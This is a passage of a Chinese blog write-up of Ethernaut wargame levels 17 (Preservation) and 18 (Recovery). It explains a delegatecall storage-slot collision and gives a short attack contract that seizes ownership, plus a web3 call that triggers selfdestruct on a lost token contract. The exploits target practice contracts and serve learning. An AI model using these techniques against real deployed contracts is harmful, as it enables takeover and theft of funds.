_timeZone2LibraryAddress</span>) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setFirstTime</span>(<span class="params">uint _timeStamp</span>) public &#123;</span><br><span class="line">    timeZone1Library.<span class="title function_">delegatecall</span>(abi.<span class="title function_">encodePacked</span>(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setSecondTime</span>(<span class="params">uint _timeStamp</span>) public &#123;</span><br><span class="line">    timeZone2Library.<span class="title function_">delegatecall</span>(abi.<span class="title function_">encodePacked</span>(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract <span class="title class_">LibraryContract</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTime</span>(<span class="params">uint _time</span>) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这关要让我们成为owner，但合约中并没有与owner有关的能够被我们调用的语句。但我们很明显能够发现，合约中只有两个函数，都使用了delegatecall从另两个合约地址中去调用setTime函数，我们在delegation题目中讲解了delegatecall的一些问题，今天我们就需要认识到他的另一个问题。</p>
+<p>delegatecall在调用时如果需要修改storage变量，他并不会通过变量名称去当前合约中查找相应的变量进行值的替换，而是会通过变量在被调用合约中的插槽进行改变。</p>
+<p>而storedTime在Library合约中存在了slot(0),但是在Preservation合约中slot 0存放的数据是timeZone1Library，也就是第一个library合约的地址，如果我们将这个地址修改为我们的攻击合约，那么之后在调用setFirstTime的时候，就会调用我们自己的setTime函数，我们以此来编写攻击合约。</p>
+<h2 id="攻击-4"><a href="#攻击-4" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">contract <span class="title class_">LibraryContract</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTime</span>(<span class="params">uint _time</span>) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    address public addr1;</span><br><span class="line">    address public addr2;</span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setTime</span>(<span class="params">uint _time</span>)public&#123;</span><br><span class="line">        owner = <span class="title function_">address</span>(_time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>1.调用setFirstTime函数，或者setSecondTime函数，将1library的地址修改为我们的攻击合约。<br><img src="https://img-blog.csdnimg.cn/3915d472828e436d8e43ccb6d3053fb8.png" alt="在这里插入图片描述"><br>2.接着再调用setFirstTime函数，将我们自己的地址传进去<br><img src="https://img-blog.csdnimg.cn/ae228a1918d14b74b90a495a497406d5.png" alt="在这里插入图片描述"><br>3.查看owner，可以看到owner已经变成了我们，提交实例关卡完成。<br><img src="https://img-blog.csdnimg.cn/7c210a8425964054ac01c5fef4afb377.png" alt="在这里插入图片描述"></p>
+<h1 id="18-Recovery"><a href="#18-Recovery" class="headerlink" title="18.Recovery"></a>18.Recovery</h1><h2 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h2><p>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Recovery</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">generateToken</span>(<span class="params">string memory _name, uint256 _initialSupply</span>) public &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">SimpleToken</span>(_name, msg.<span class="property">sender</span>, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SimpleToken</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">string memory _name, address _creator, uint256 _initialSupply</span>) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = msg.<span class="property">value</span>.<span class="title function_">mul</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint _amount</span>) public &#123; </span><br><span class="line">    <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] &gt;= _amount);</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = balances[msg.<span class="property">sender</span>].<span class="title function_">sub</span>(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">destroy</span>(<span class="params">address payable _to</span>) public &#123;</span><br><span class="line">    <span class="title function_">selfdestruct</span>(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>合约创造者创建了一个token合约，但却遗忘了它的地址，需要我们找到丢失的地址，并恢复以太。我们分析一下这个过程，合约创建者创建了工厂合约，然后工程合约有创建了token合约，要知道，区块链浏览器中可以查看到一个交易的全过程，我们以此进行攻击。</p>
+<h2 id="攻击-5"><a href="#攻击-5" class="headerlink" title="攻击"></a>攻击</h2><p>源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Recovery</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">generateToken</span>(<span class="params">string memory _name, uint256 _initialSupply</span>) public &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">SimpleToken</span>(_name, msg.<span class="property">sender</span>, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SimpleToken</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">string memory _name, address _creator, uint256 _initialSupply</span>) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = msg.<span class="property">value</span>.<span class="title function_">mul</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint _amount</span>) public &#123; </span><br><span class="line">    <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] &gt;= _amount);</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = balances[msg.<span class="property">sender</span>].<span class="title function_">sub</span>(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">destroy</span>(<span class="params">address payable _to</span>) public &#123;</span><br><span class="line">    <span class="title function_">selfdestruct</span>(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们去 区块链浏览器上，很明显能看出交易全过程，我们创建了实例，关卡合约创建了工厂合约，工厂合约再创建了代币合约。所以最后一个地址就是我们要找到的地址。<br><img src="https://img-blog.csdnimg.cn/6121c4c29a8040abbd6ef28e404a7e31.png" alt="在这里插入图片描述"><br>接着找回丢失的以太。我们通过encodeFunctionSignature获取函数指示，并构造参数。最后通过sendTransaction发送出来。<br>我们输入await web3.eth.sendTransaction({from:player,to:target,data:await web3.eth.abi.encodeWithSignature(“destroy(address)”) + “000000000000000000000000 +”目标合约地址”})<br>即可完成攻击，提交实例，关卡完成。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>lucifer
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/12/01/Ethernaut%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%B8%89%EF%BC%89/" title="Ethernaut靶场学习实践（三）">http://example.com/2022/12/01/Ethernaut靶场学习实践（三）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/01/Ethernaut%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%EF%BC%88%E4%BA%8C%EF%BC%89/" rel="prev" title="Ethernaut靶场学习实践（二）">
+      <i class="fa fa-chevron-left"></i> Ethernaut靶场学习实践（二）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/12/01/capture-the-ether%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3-Lotteries/" rel="next" title="capture the ether靶场题解(Lotteries)">
+      capture the ether靶场题解(Lotteries) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#13-Privacy"><span class="nav-number">1.</span> <span class="nav-text">13.Privacy</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB"><span class="nav-number">1.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#14-Gatekeeper-One"><span class="nav-number">2.</span> <span class="nav-text">14.Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-number">2.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-1"><span class="nav-number">2.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#15-Gatekeeper-Two"><span class="nav-number">3.</span> <span class="nav-text">15.Gatekeeper Two</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-2"><span class="nav-number">3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-2"><span class="nav-number">3.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#16-Naught-Coin"><span class="nav-number">4.</span> <span class="nav-text">16.Naught Coin</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-3"><span class="nav-number">4.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-3"><span class="nav-number">4.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#17-Preservation"><span class="nav-number">5.</span> <span class="nav-text">17.Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-4"><span class="nav-number">5.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-4"><span class="nav-number">5.2.</span> <span class="nav-text">攻击</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#18-Recovery"><span class="nav-number">6.</span> <span class="nav-text">18.Recovery</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-5"><span class="nav-number">6.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB-5"><span class="nav-number">6.2.</span> <span class="nav-text">攻击</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lucifer</p>
+  <div class="site-description" itemprop="description">我的老婆严菡是猪</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lucifer</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">190k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">2:53</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
